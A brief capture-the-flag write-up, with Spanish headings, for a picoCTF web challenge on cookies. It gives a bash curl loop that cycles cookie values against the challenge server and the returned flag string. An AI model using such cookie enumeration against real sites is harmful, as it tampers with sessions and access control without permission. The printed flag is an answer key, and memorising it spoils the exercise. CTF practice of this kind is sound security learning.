# Web picoCTF

## Descripcion

Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:27177/](http://mercury.picoctf.net:27177/)

## Pistas (Si hay)



## Solución

``` Bash

┌──(kali㉿kali)-[~]
└─$ for i in {0..25}; do curl -s http://mercury.picoctf.net:27177/check -H "Cookie: name=$i"; done | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_064663be}</code></p>


```

## Referencias